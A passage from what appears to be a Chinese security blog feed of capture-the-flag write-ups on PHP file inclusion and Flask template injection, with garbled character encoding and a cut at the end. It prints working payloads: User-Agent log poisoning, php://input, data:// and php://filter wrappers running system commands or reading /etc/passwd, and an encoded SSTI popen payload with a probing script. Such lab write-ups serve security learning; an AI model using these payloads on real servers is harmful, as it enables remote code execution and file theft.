    <content type="html"><![CDATA[<p>é¢˜ç›®æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-16 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-16 15:51:31</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>è¿™é¢˜å¤šè¿‡æ»¤æ‰äº†å†’å·<code>:</code>ï¼Œä¼ªåè®®<code>php://</code>å¼€å¤´çš„éƒ½ä¸èƒ½ç”¨äº†</p><blockquote><p>æ—¥å¿—æ–‡ä»¶æ˜¯æœåŠ¡å™¨ç”¨æ¥è®°å½•å„ç§æ“ä½œå’Œè®¿é—®ä¿¡æ¯çš„æ–‡ä»¶ï¼Œæ¯”å¦‚ç½‘ç«™æœåŠ¡å™¨ä¼šè®°å½•ç”¨æˆ·çš„è®¿é—®è¯·æ±‚ã€æ¥æºåœ°å€ã€ä½¿ç”¨çš„æµè§ˆå™¨ä¿¡æ¯ç­‰ã€‚å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿåœ¨å‘é€ç»™ç½‘ç«™çš„è¯·æ±‚ï¼ˆæ¯”å¦‚ç½‘å€ã€ç”¨æˆ·ä»£ç†ä¿¡æ¯ç­‰ï¼‰ä¸­æ’å…¥æ¶æ„ä»£ç ï¼Œè¿™äº›ä»£ç å°±ä¼šè¢«æœåŠ¡å™¨è®°å½•åˆ°æ—¥å¿—æ–‡ä»¶ä¸­ã€‚å½“æœåŠ¡å™¨åç»­è¯»å–æˆ–å¤„ç†è¿™äº›æ—¥å¿—æ–‡ä»¶æ—¶ï¼Œå¦‚æœå­˜åœ¨æ¼æ´ï¼Œæ¶æ„ä»£ç å°±å¯èƒ½è¢«å½“ä½œæ­£å¸¸çš„ä»£ç æ‰§è¡Œï¼Œä»è€Œå®ç°æ”»å‡»ç›®çš„ï¼Œæ¯”å¦‚è·å–æœåŠ¡å™¨çš„æ§åˆ¶æƒ</p></blockquote><p>æœåŠ¡å™¨æ˜¯Nginxçš„</p><p><img src="/2025/05/25/ctfshow-web81-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250519202044085.png" alt="image-20250519202044085"></p><p>å¯ä»¥è¿›è¡Œæ—¥å¿—æ–‡ä»¶åŒ…å«ï¼Œåœ¨<code>User-Agent</code>ä¸­å†™å…¥æ¶æ„å‘½ä»¤ï¼Œç„¶ååŒ…å«æ—¥å¿—æ–‡ä»¶ä»è€Œå¾—åˆ°å‘½ä»¤çš„å›æ˜¾</p><p>Nginxé»˜è®¤æ—¥å¿—è·¯å¾„æ˜¯<code>/var/log/nginx/access.log</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">User-Agent: <span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-meta">?&gt;</span><br><br>?file=/<span class="hljs-keyword">var</span>/log/nginx/access.log<br></code></pre></td></tr></table></figure><p><img src="/2025/05/25/ctfshow-web81-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250519201327703.png" alt="image-20250519201327703"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">User-Agent: <span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat fl0g.php&#x27;</span>);<span class="hljs-meta">?&gt;</span><br><br>?file=/<span class="hljs-keyword">var</span>/log/nginx/access.log<br></code></pre></td></tr></table></figure><p><img src="/2025/05/25/ctfshow-web81-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20250519201422397.png" alt="image-20250519201422397"></p>]]></content>
    
    
    <categories>
      
      <category>æ¼æ´ç¬”è®°</category>
      
      <category>æ–‡ä»¶åŒ…å«</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ–‡ä»¶åŒ…å« æ—¥å¿—æ–‡ä»¶åŒ…å«</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow-web80-æ–‡ä»¶åŒ…å«-inputä¼ªåè®®</title>
    <link href="/2025/05/25/ctfshow-web80-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-input%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <url>/2025/05/25/ctfshow-web80-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-input%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<p>é¢˜ç›®æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-16 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-16 11:26:29</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>è¿™é¢˜å¤šè¿‡æ»¤æ‰äº†<code>data</code>ï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨<code>data://</code>ä¼ªåè®®äº†ï¼Œå¯ä»¥ä½¿ç”¨<code>php://input</code>ä¼ªåè®®ï¼Œç„¶ååœ¨POSTè¯·æ±‚ä½“ä¸­ä¼ å…¥è¦æ‰§è¡Œçš„æ¶æ„ä»£ç ï¼Œ<code>php</code>å¯ä»¥ä½¿ç”¨å¤§å†™<code>PHP</code>ç»•è¿‡ï¼Œæµ‹è¯•å‘ç°æµè§ˆå™¨çš„<code>HackBar</code>æ²¡ç”¨ï¼Œå¯ä»¥ä½¿ç”¨bpæŠ“åŒ…å‘é€è¯·æ±‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">?file=php:<span class="hljs-comment">//input</span><br><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/25/ctfshow-web80-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-input%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20250519202542810-1748135260796-9.png" alt="image-20250519202542810"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">?file=php:<span class="hljs-comment">//input</span><br><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat fl0g.php&#x27;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/25/ctfshow-web80-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-input%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20250519202605778-1748135260780-8.png" alt="image-20250519202605778"></p>]]></content>
    
    
    <categories>
      
      <category>æ¼æ´ç¬”è®°</category>
      
      <category>æ–‡ä»¶åŒ…å«</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ–‡ä»¶åŒ…å« ä¼ªåè®®</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow-web79-æ–‡ä»¶åŒ…å«-dataä¼ªåè®®</title>
    <link href="/2025/05/25/ctfshow-web79-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-data%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <url>/2025/05/25/ctfshow-web79-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-data%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<p>é¢˜ç›®æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-16 11:10:14</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-16 11:12:38</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>æ¯”ä¸Šä¸€é¢˜å¤šä½¿ç”¨<code>str_replace</code>å‡½æ•°å°†å‚æ•°<code>file</code>ä¸­çš„<code>php</code>æ¢æˆ<code>???</code></p><p>å¯ä»¥ä½¿ç”¨<code>data://</code>ä¼ªåè®®æ‰§è¡Œå‘½ä»¤</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?file=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /flag.php&#x27;</span>);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p><img src="/web79-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-data%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20250519195007186.png" alt="image-20250519195007186"></p><p>ç›´æ¥ä½¿ç”¨æ²¡å›æ˜¾ï¼ŒåŠ ä¸Šbase64è¿›è¡Œç¼–ç </p><p><img src="/web79-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-data%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20250519195110043.png" alt="image-20250519195110043"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=data://text/plain;<span class="hljs-built_in">base64</span>,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcucGhwJyk7Pz4=<br></code></pre></td></tr></table></figure><p><img src="/web79-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-data%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20250519195231088.png" alt="image-20250519195231088"></p><p>ä¹Ÿå¯ä»¥ä½¿ç”¨å¤§å†™ç»•è¿‡å¯¹<code>php</code>çš„è¿‡æ»¤ï¼Œä½†æ˜¯å¯èƒ½ä¼šä¸çŸ¥é“<code>flag</code>çš„æ–‡ä»¶åï¼Œè€Œä¸”<code>flag.php</code>ä¹Ÿæœ‰<code>php</code>ä¸å¥½ç»•è¿‡</p>]]></content>
    
    
    <categories>
      
      <category>æ¼æ´ç¬”è®°</category>
      
      <category>æ–‡ä»¶åŒ…å«</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ–‡ä»¶åŒ…å« ä¼ªåè®®</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow-web78-æ–‡ä»¶åŒ…å«-filterä¼ªåè®®</title>
    <link href="/2025/05/25/ctfshow-web78-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-filter%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <url>/2025/05/25/ctfshow-web78-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-filter%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<p>é¢˜ç›®æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-16 10:52:43</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-16 10:54:20</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>GETæ–¹æ³•ä¼ å‚<code>file</code>ï¼Œå¯ä»¥åˆ©ç”¨<code>include</code>å‡½æ•°è¿›è¡Œæ–‡ä»¶åŒ…å«</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?f</span>ile=<span class="hljs-regexp">/etc/passwd</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/25/ctfshow-web78-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-filter%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20250519193600387.png" alt="image-20250519193600387"></p><p>ç›´æ¥åŒ…å«<code>flag.php</code>æ²¡å›æ˜¾ï¼Œå¯ä»¥åŠ ä¸Šä¼ªåè®®åŒ…å«å›æ˜¾å†…å®¹</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">?<span class="hljs-built_in">file</span>=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><p><img src="/2025/05/25/ctfshow-web78-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-filter%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20250519193840508.png" alt="image-20250519193840508"></p><p>base64è§£ç è·å¾—flag</p><p><img src="/2025/05/25/ctfshow-web78-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-filter%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20250519193909554.png" alt="image-20250519193909554"></p>]]></content>
    
    
    <categories>
      
      <category>æ¼æ´ç¬”è®°</category>
      
      <category>æ–‡ä»¶åŒ…å«</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ–‡ä»¶åŒ…å« ä¼ªåè®®</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è½©è¾•æ¯webå¤ç°</title>
    <link href="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<blockquote><p>å€Ÿé‰´å¤§ä½¬çš„WPè¿›è¡Œçš„å¤ç°ï¼š<a href="https://www.yuque.com/lrving-idamg/ewng72/fgbuc2b4gie52iy0?singleDoc#ezweb1">https://www.yuque.com/lrving-idamg/ewng72/fgbuc2b4gie52iy0?singleDoc#ezweb1</a></p></blockquote><h1 id="ezflask"><a href="#ezflask" class="headerlink" title="ezflask"></a>ezflask</h1><p>çœ‹é¢˜ç›®å°±çŸ¥é“æ˜¯flaskå†™çš„ï¼Œå¤§æ¦‚ç‡æ˜¯SSTI</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">6</span>*<span class="hljs-number">6</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522130922771.png" alt="image-20250522130922771"></p><p>æµ‹è¯•å‘ç°æ˜¯SSTIï¼ŒGETä¼ å‚<code>name</code>ï¼Œä½¿ç”¨bpçˆ†å‡ºè¿‡æ»¤æ‰çš„å­—ç¬¦å¦‚ä¸‹</p><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522131803520.png" alt="image-20250522131803520"></p><p>è¿‡æ»¤äº†ç‚¹<code>.</code>ï¼šå¯ä»¥ä½¿ç”¨ä¸­æ‹¬å·ç»•è¿‡</p><p>è¿‡æ»¤äº†<code>popen</code>ï¼šå¯ä»¥è¿›è¡Œåå…­è¿›åˆ¶ç¼–ç ç»•è¿‡ï¼Œåé¢å‘ç°<code>cat flag</code>ä¹Ÿè¢«è¿‡æ»¤äº†ï¼ŒåŒæ ·ä¹Ÿæ˜¯è¿›è¡Œç¼–ç ç»•è¿‡</p><p>ä½¿ç”¨è„šæœ¬æ‰¾åˆ°å¯ç”¨çš„ç±»ï¼Œè„šæœ¬å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&#x27;http://27.25.151.26:56881/?name=&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">500</span>):<br>    param = <span class="hljs-string">f&quot;()[&#x27;__class__&#x27;][&#x27;__base__&#x27;][&#x27;__subclasses__&#x27;]()[<span class="hljs-subst">&#123;i&#125;</span>]&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        fin_url = url + <span class="hljs-string">&quot;&#123;&#123;&quot;</span> + param + <span class="hljs-string">&quot;&#125;&#125;&quot;</span><br>        <span class="hljs-comment">#print(fin_url)</span><br>        response = requests.get(fin_url)<br>        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;os._wrap_close&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>                <span class="hljs-built_in">print</span>(i)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/1747745132579-c7b61e77-f2ee-429c-8f1d-8238524f9b43.webp" alt="å›¾ç‰‡.png"></p><p>ç›®æ ‡paylaod</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">&#123;&#123; ()<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__class__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__base__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__subclasses__&#x27;</span>]</span>()<span class="hljs-selector-attr">[133]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__init__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__globals__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;popen&#x27;</span>]</span>(&#x27;cat /flag&#x27;)<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;read&#x27;</span>]</span>() &#125;&#125;<br></code></pre></td></tr></table></figure><p>æœ€ç»ˆpayloadä¸º</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">&#123;&#123; ()<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__class__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__base__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__subclasses__&#x27;</span>]</span>()<span class="hljs-selector-attr">[133]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__init__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__globals__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;\x70\x6f\x70\x65\x6e&#x27;</span>]</span>(&#x27;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&#x27;)<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;read&#x27;</span>]</span>() &#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522131944293.png" alt="image-20250522131944293"></p><h1 id="ezjs"><a href="#ezjs" class="headerlink" title="ezjs"></a>ezjs</h1><p>æ¸¸æˆé¢˜å°±çœ‹jsä»£ç ï¼Œå¯ä»¥åœ¨<code>main.js</code>ä¸­çœ‹åˆ°å…³äºè·å–flagçš„å‡½æ•°</p><p><img src="/2025/05/22/%E8%BD%A9%E8%BE%95%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522132213742.png" alt="image-20250522132213742"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">if</span> (scoreNow === <span class="hljs-number">100000000000</span>) &#123;<br>        <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;getflag.php&#x27;</span>, &#123;<br>            <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>            <span class="hljs-attr">headers</span>: &#123;<br>                <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>            &#125;,<br>            <span class="hljs-attr">body</span>: <span class="hljs-string">&#x27;score=&#x27;</span> + scoreNow<br>        &#125;)<br>        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">text</span>())<br>        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> &#123;<br>            <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;æ­å–œä½ ï¼flagæ˜¯ï¼š&quot;</span> + data);<br>        &#125;)<br>        .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span 